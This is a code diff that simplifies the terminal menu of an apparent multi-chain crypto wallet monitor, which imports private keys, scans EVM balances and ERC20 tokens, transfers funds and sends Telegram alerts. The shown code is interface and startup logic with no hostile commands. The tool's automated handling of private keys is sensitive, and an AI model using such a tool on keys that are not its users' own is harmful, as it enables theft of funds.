-        print(f"{Fore.YELLOW}│{Style.RESET_ALL} 🌐 {Fore.CYAN}网络:{Style.RESET_ALL} {available_networks}/{total_networks} 可用 {network_bar} {Fore.GREEN}主网:{mainnet_count}{Style.RESET_ALL} {Fore.BLUE}测试:{testnet_count}{Style.RESET_ALL} {Fore.YELLOW}│{Style.RESET_ALL}")
-        
-        # 转账统计行
-        if total_transfers > 0:
-            transfer_info = f"{Fore.GREEN}✅ {total_transfers} 笔 (${total_amount:.6f} ETH) 🪙{erc20_transfers} ERC20{Style.RESET_ALL}"
-        else:
-            transfer_info = f"{Fore.LIGHTBLACK_EX}📋 暂无转账记录{Style.RESET_ALL}"
-        print(f"{Fore.YELLOW}│{Style.RESET_ALL} 📋 {Fore.CYAN}转账:{Style.RESET_ALL} {transfer_info:<55} {Fore.YELLOW}│{Style.RESET_ALL}")
-        
-        # API状态行
-        api_indicator = f"#{CURRENT_API_KEY_INDEX + 1}/{api_status['total_keys']}"
-        api_usage = f"[{API_REQUEST_COUNT}/{REQUESTS_PER_API}]"
-        api_key_display = f"{ALCHEMY_API_KEYS[CURRENT_API_KEY_INDEX][:12]}..." if ALCHEMY_API_KEYS else "未配置"
-        print(f"{Fore.YELLOW}│{Style.RESET_ALL} 🔑 {Fore.CYAN}API:{Style.RESET_ALL} {api_indicator} ({api_key_display}) {api_usage} {Fore.GREEN}轮询系统{Style.RESET_ALL} {Fore.YELLOW}│{Style.RESET_ALL}")
-        
-        # 速率控制行
-        usage_percent = rate_info['current_usage_percent']
-        usage_bar = self.create_usage_bar(usage_percent, 15)
-        remaining_days = rate_info['remaining_days']
-        interval = rate_info['optimal_interval']
-        print(f"{Fore.YELLOW}│{Style.RESET_ALL} ⚡ {Fore.CYAN}速率:{Style.RESET_ALL} {remaining_days}天剩余 {usage_bar} {usage_percent:.1f}%已用 间隔{interval:.1f}s {Fore.YELLOW}│{Style.RESET_ALL}")
-        
-        # TG通知状态行
-        tg_status = f"{Fore.GREEN}✅ 已启用{Style.RESET_ALL}" if TELEGRAM_NOTIFICATIONS_ENABLED else f"{Fore.RED}❌ 已禁用{Style.RESET_ALL}"
-        tg_stats = f"成功:{TRANSFER_STATS['successful_notifications']} 失败:{TRANSFER_STATS['failed_notifications']}"
-        print(f"{Fore.YELLOW}│{Style.RESET_ALL} 📱 {Fore.CYAN}TG通知:{Style.RESET_ALL} {tg_status} {Fore.LIGHTBLACK_EX}({tg_stats}){Style.RESET_ALL} {Fore.YELLOW}│{Style.RESET_ALL}")
-        
-        print(f"{Fore.YELLOW}└─────────────────────────────────────────────────────────────────────────┘{Style.RESET_ALL}")
-
-    def create_progress_bar(self, current: int, total: int, length: int = 20) -> str:
-        """创建进度条"""
-        if total == 0:
-            return f"{Fore.RED}{'█' * length}{Style.RESET_ALL}"
-        
-        progress = current / total
-        filled = int(progress * length)
-        
-        if progress >= 0.8:
-            color = Fore.GREEN
-        elif progress >= 0.5:
-            color = Fore.YELLOW  
-        else:
-            color = Fore.RED
-            
-        bar = color + '█' * filled + Fore.LIGHTBLACK_EX + '░' * (length - filled) + Style.RESET_ALL
-        return f"[{bar}]"
-
-    def create_usage_bar(self, percentage: float, length: int = 15) -> str:
-        """创建使用率进度条"""
-        filled = int((percentage / 100) * length)
-        
-        if percentage >= 80:
-            color = Fore.RED
-        elif percentage >= 60:
-            color = Fore.YELLOW
-        else:
-            color = Fore.GREEN
-            
-        bar = color + '█' * filled + Fore.LIGHTBLACK_EX + '░' * (length - filled) + Style.RESET_ALL
-        return f"[{bar}]"
-    
-    def main_menu(self):
-        """主菜单 - 超级美化版本"""
-        while True:
-            # 清屏，提供清爽的界面
-            try:
-                os.system('clear' if os.name == 'posix' else 'cls')
-            except:
-                print("\n" * 50)  # 替代清屏
-            
-            # 🌟 超级美化的横幅
-            print(f"\n{Back.MAGENTA}{Fore.WHITE}{'  ' * 45}{Style.RESET_ALL}")
-            print(f"{Back.MAGENTA}{Fore.WHITE}    🚀 {Fore.YELLOW}钱包监控转账系统 v4.0{Fore.WHITE} - 智能3阶段扫描版 🚀    {Style.RESET_ALL}")
-            print(f"{Back.MAGENTA}{Fore.WHITE}    💎 {len(SUPPORTED_NETWORKS)}个EVM链 | 🪙 ERC20代币 | 📱 TG通知 | ⚡ 智能Gas     {Style.RESET_ALL}")
-            print(f"{Back.MAGENTA}{Fore.WHITE}{'  ' * 45}{Style.RESET_ALL}\n")
-            
-            # 🎨 新功能亮点展示
-            print(f"{Fore.MAGENTA}┌{'─' * 78}┐{Style.RESET_ALL}")
-            print(f"{Fore.MAGENTA}│ ✨ {Fore.CYAN}新功能亮点{Fore.MAGENTA}                                                      │{Style.RESET_ALL}")
-            print(f"{Fore.MAGENTA}│ {Fore.GREEN}🔍 动态RPC测试{Fore.WHITE} → {Fore.YELLOW}📊 交易记录分析{Fore.WHITE} → {Fore.BLUE}💰 智能余额扫描{Fore.MAGENTA}        │{Style.RESET_ALL}")
-            print(f"{Fore.MAGENTA}│ {Fore.GREEN}💰 实时代币价值查询{Fore.WHITE} | {Fore.YELLOW}⚡ 小余额Gas优化{Fore.WHITE} | {Fore.BLUE}📱 完整TG报告{Fore.MAGENTA}        │{Style.RESET_ALL}")
-            print(f"{Fore.MAGENTA}└{'─' * 78}┘{Style.RESET_ALL}\n")
-            
-            # 🎯 系统状态美化显示
-            self.show_enhanced_status()
-            
-            # 🎨 美化菜单
-            print(f"\n{Fore.CYAN}┌─── {Fore.YELLOW}🎯 功能菜单{Fore.CYAN} ────────────────────────────────────────────────────────┐{Style.RESET_ALL}")
-            print(f"{Fore.CYAN}│{Style.RESET_ALL}                                                                      {Fore.CYAN}│{Style.RESET_ALL}")
-            
-            menu_items = [
-                ("1", "📥", "导入私钥", "智能批量识别，支持任意格式", Fore.GREEN),
-                ("2", "🎯", "开始监控", "智能3阶段扫描：RPC→交易→余额+ERC20", Fore.YELLOW),
-                ("3", "📊", "详细状态", "完整诊断，网络分析，性能监控", Fore.BLUE),
-                ("4", "🔑", "API密钥管理", "轮询系统，无限扩展，智能切换", Fore.MAGENTA),
-                ("5", "🔄", "重启程序", "清理缓存，重新初始化网络", Fore.CYAN),
-                ("6", "📖", "使用帮助", "完整指南，故障排除，操作说明", Fore.WHITE),
-                ("7", "🚪", "退出程序", "安全退出，保存状态，清理资源", Fore.RED)
-            ]
-            
-            for num, icon, title, desc, color in menu_items:
-                print(f"{Fore.CYAN}│{Style.RESET_ALL} {Back.BLACK}{color}{num}{Style.RESET_ALL} {icon} {Fore.WHITE}{title:<12}{Style.RESET_ALL} {Fore.LIGHTBLACK_EX}{desc:<35}{Style.RESET_ALL} {Fore.CYAN}│{Style.RESET_ALL}")
-            
-            print(f"{Fore.CYAN}│{Style.RESET_ALL}                                                                      {Fore.CYAN}│{Style.RESET_ALL}")
-            print(f"{Fore.CYAN}└──────────────────────────────────────────────────────────────────────┘{Style.RESET_ALL}")
-            
-            # 🎨 美化输入提示
-            print(f"\n{Fore.GREEN}┌─── {Fore.YELLOW}💡 操作提示{Fore.GREEN} ───┐{Style.RESET_ALL}")
-            print(f"{Fore.GREEN}│{Style.RESET_ALL} {Fore.CYAN}📝 请输入数字 1-7{Style.RESET_ALL}    {Fore.GREEN}│{Style.RESET_ALL}")
-            print(f"{Fore.GREEN}│{Style.RESET_ALL} {Fore.YELLOW}⏳ 然后按回车键确认{Style.RESET_ALL}  {Fore.GREEN}│{Style.RESET_ALL}")
-            print(f"{Fore.GREEN}└─────────────────────┘{Style.RESET_ALL}")
-            
-            print(f"\n{Fore.MAGENTA}✨ 系统就绪，等待您的选择...{Style.RESET_ALL}")
-            
-            try:
-                # 确保提示信息完全显示
-                import sys
-                sys.stdout.flush()
-                
-                choice = enhanced_safe_input(f"\n{Back.BLUE}{Fore.WHITE} ➤ 请选择功能: {Style.RESET_ALL} ", "").strip()
-                
-                if choice:
-                    print(f"\n{Fore.GREEN}🎉 您选择了选项 {Back.GREEN}{Fore.BLACK} {choice} {Style.RESET_ALL} {Fore.GREEN}正在执行...{Style.RESET_ALL}")
-                    time.sleep(0.5)  # 视觉反馈延迟
-                
-                # 处理空输入
-                if not choice:
-                    print(f"\n{Back.RED}{Fore.WHITE} ⚠️ 输入为空 {Style.RESET_ALL}")
-                    print(f"{Fore.YELLOW}💡 提示: 请输入菜单中显示的数字 (1-7)，然后按回车键{Style.RESET_ALL}")
-                    time.sleep(3)
-                    continue
-                
-                # 显示用户选择的确认
-                print(f"{Fore.GREEN}✅ 您选择了: {choice}{Style.RESET_ALL}")
-                
-                # 验证输入是否为有效数字
-                if choice not in ["1", "2", "3", "4", "5", "6", "7"]:
-                    print(f"\n{Fore.RED}❌ 无效选择 '{choice}'，请输入 1-7{Style.RESET_ALL}")
-                    print(f"{Fore.YELLOW}💡 提示: 请输入菜单中显示的数字 (1、2、3、4、5、6 或 7){Style.RESET_ALL}")
-                    time.sleep(3)  # 给用户时间看到提示
-                    continue
+                choice = input(f"{Fore.CYAN}请选择功能 (1-5): {Style.RESET_ALL}").strip()
                 
                 if choice == "1":
                     self.import_private_keys_menu()
@@ -3642,134 +1780,33 @@ class WalletMonitor:
                     self.start_monitoring_menu()
                 elif choice == "3":
                     self.show_detailed_status()
-                    enhanced_safe_input(f"\n{Fore.CYAN}按回车键返回主菜单...{Style.RESET_ALL}")
+                    input(f"\n{Fore.CYAN}按回车键返回主菜单...{Style.RESET_ALL}")
                 elif choice == "4":
-                    self.api_key_management_menu()
-                elif choice == "5":
-                    self.restart_program()
-                elif choice == "6":
                     self.show_help_menu()
-                    enhanced_safe_input(f"\n{Fore.CYAN}按回车键返回主菜单...{Style.RESET_ALL}")
-                elif choice == "7":
+                    input(f"\n{Fore.CYAN}按回车键返回主菜单...{Style.RESET_ALL}")
+                elif choice == "5":
                     print(f"\n{Fore.GREEN}👋 感谢使用钱包监控系统！{Style.RESET_ALL}")
                     print(f"{Fore.CYAN}💾 所有数据已自动保存{Style.RESET_ALL}")
                     print(f"{Fore.CYAN}🔄 下次启动会自动恢复所有配置{Style.RESET_ALL}")
                     break
+                else:
+                    print(f"\n{Fore.RED}❌ 无效选择，请输入 1-5{Style.RESET_ALL}")
+                    print(f"{Fore.YELLOW}💡 提示: 请输入菜单中显示的数字 (1、2、3、4 或 5){Style.RESET_ALL}")
+                    time.sleep(3)  # 给用户时间看到提示
                     
             except KeyboardInterrupt:
                 print(f"\n\n{Fore.GREEN}👋 感谢使用钱包监控系统！{Style.RESET_ALL}")
                 print(f"{Fore.CYAN}💾 数据已保存{Style.RESET_ALL}")
                 break
-            except EOFError:
-                print(f"\n{Fore.YELLOW}⚠️ 输入流异常，尝试重新初始化...{Style.RESET_ALL}")
-                try:
-                    # 尝试重新打开stdin
-                    import sys
-                    sys.stdin = open('/dev/tty', 'r') if os.path.exists('/dev/tty') else sys.stdin
-                    print(f"{Fore.GREEN}✅ 输入流已重新初始化{Style.RESET_ALL}")
-                    time.sleep(1)
-                    continue
-                except:
-                    print(f"{Fore.RED}❌ 无法修复输入流，程序退出{Style.RESET_ALL}")
-                    break
             except Exception as e:
                 print(f"\n{Fore.RED}❌ 系统错误: {e}{Style.RESET_ALL}")
                 print(f"{Fore.YELLOW}💡 程序将在3秒后继续，如持续出错请重启{Style.RESET_ALL}")
                 time.sleep(3)
 
-def smart_cache_cleanup():
-    """智能缓存清理 - 保留日志文件"""
-    import glob
-    
-    print(f"{Fore.CYAN}🧹 智能缓存清理中...{Style.RESET_ALL}")
-    
-    try:
-        # 要保留的重要文件
-        preserve_files = {
-            'wallets.json',
-            'monitoring_log.json', 
-            'config.json',
-            'wallet_monitor.py',
-            'install.sh',
-            'README.md'
-        }
-        
-        # 清理Python缓存
-        cache_patterns = ['__pycache__', '.pytest_cache', '*.pyc', '*.pyo']
-        cleaned_count = 0
-        
-        for pattern in cache_patterns:
-            for file_path in glob.glob(pattern, recursive=True):
-                try:
-                    if os.path.isdir(file_path):
-                        import shutil
-                        shutil.rmtree(file_path)
-                        cleaned_count += 1
-                    else:
-                        os.remove(file_path)
-                        cleaned_count += 1
-                except:
-                    pass
-        
-        # 清理临时文件 (保留日志)
-        temp_patterns = ['*.tmp', '*.temp', '*.bak', '*.old']
-        for pattern in temp_patterns:
-            for file_path in glob.glob(pattern):
-                if os.path.basename(file_path) not in preserve_files:
-                    try:
-                        os.remove(file_path)
-                        cleaned_count += 1
-                    except:
-                        pass
-        
-        if cleaned_count > 0:
-            print(f"{Fore.GREEN}✅ 清理了 {cleaned_count} 个缓存文件，日志已保留{Style.RESET_ALL}")
-        else:
-            print(f"{Fore.CYAN}✅ 缓存已是最新状态{Style.RESET_ALL}")
-        
-    except Exception as e:
-        print(f"{Fore.YELLOW}⚠️ 缓存清理遇到问题: {e}{Style.RESET_ALL}")
-
-def enhanced_enhanced_safe_input(prompt: str, default: str = "") -> str:
-    """增强的安全输入函数，处理各种输入异常"""
-    import sys
-    
-    try:
-        # 确保输出缓冲区刷新
-        sys.stdout.flush()
-        sys.stderr.flush()
-        
-        # 检查stdin是否可用
-        if not sys.stdin.isatty():
-            print(f"\n{Fore.YELLOW}⚠️ 非交互模式，使用默认值: {default}{Style.RESET_ALL}")
-            return default
-        
-        # 尝试标准输入
-        result = input(prompt)
-        return result.strip() if result else default
-        
-    except EOFError:
-        print(f"\n{Fore.YELLOW}⚠️ 输入流结束，使用默认值: {default}{Style.RESET_ALL}")
-        return default
-    except KeyboardInterrupt:
-        print(f"\n{Fore.YELLOW}⚠️ 用户中断，使用默认值: {default}{Style.RESET_ALL}")
-        return default
-    except Exception as e:
-        print(f"\n{Fore.RED}❌ 输入错误: {e}，使用默认值: {default}{Style.RESET_ALL}")
-        return default
-
 def main():
     """主函数 - 自动启动"""
     try:
         print(f"{Fore.CYAN}🚀 正在启动钱包监控系统...{Style.RESET_ALL}")
-        
-        # 智能缓存清理
-        smart_cache_cleanup()
-        
-        # 强制交互模式启动
-        print(f"{Fore.CYAN}🔍 启用强制交互模式...{Style.RESET_ALL}")
-        print(f"{Fore.GREEN}✅ 交互模式已启用{Style.RESET_ALL}")
-        
         print(f"{Fore.GREEN}✨ 自动进入主菜单模式{Style.RESET_ALL}")
         time.sleep(1)
         
@@ -3787,52 +1824,6 @@ def main():
         print(f"{Fore.YELLOW}💡 请检查网络连接和依赖安装{Style.RESET_ALL}")
         sys.exit(1)
 
-def force_interactive_mode():
-    """强制启用交互模式"""
-    import sys
-    import os
-    
-    # 确保标准输入输出都是可用的
-    try:
-        # 尝试重新打开标准输入
-        if not hasattr(sys.stdin, 'isatty') or not sys.stdin.isatty():
-            # 在某些环境下，重新打开tty
-            if os.path.exists('/dev/tty'):
-                sys.stdin = open('/dev/tty', 'r')
-                print(f"{Fore.GREEN}✅ 已重新连接到交互终端{Style.RESET_ALL}")
-    except:
-        pass
-    
-    # 确保输出缓冲
-    sys.stdout.flush()
-    sys.stderr.flush()
-    
-    print(f"{Fore.GREEN}🎯 强制交互模式已启用{Style.RESET_ALL}")
-
 if __name__ == "__main__":
-    # 检查命令行参数
-    import sys
-    
-    if len(sys.argv) > 1 and sys.argv[1] == '--safe-mode':
-        print(f"{Fore.CYAN}🛡️ 安全模式启动 (非交互)...{Style.RESET_ALL}")
-        try:
-            smart_cache_cleanup()
-            monitor = WalletMonitor()
-            monitor.initialize_clients()
-            print(f"\n{Fore.GREEN}✅ 系统初始化完成{Style.RESET_ALL}")
-            print(f"{Fore.CYAN}💡 请使用正常模式启动: python3 wallet_monitor.py{Style.RESET_ALL}")
-        except Exception as e:
-            print(f"{Fore.RED}❌ 安全模式启动失败: {e}{Style.RESET_ALL}")
-    elif len(sys.argv) > 1 and sys.argv[1] == '--fast':
-        print(f"{Fore.CYAN}🚀 快速启动模式 (跳过网络初始化)...{Style.RESET_ALL}")
-        try:
-            monitor = WalletMonitor()
-            # 跳过网络初始化，直接进入菜单
-            monitor.main_menu()
-        except Exception as e:
-            print(f"{Fore.RED}❌ 快速启动失败: {e}{Style.RESET_ALL}")
-    else:
-        # 强制启用交互模式
-        force_interactive_mode()
-        # 自动启动主程序
-        main()
+    # 自动启动主程序
+    main()
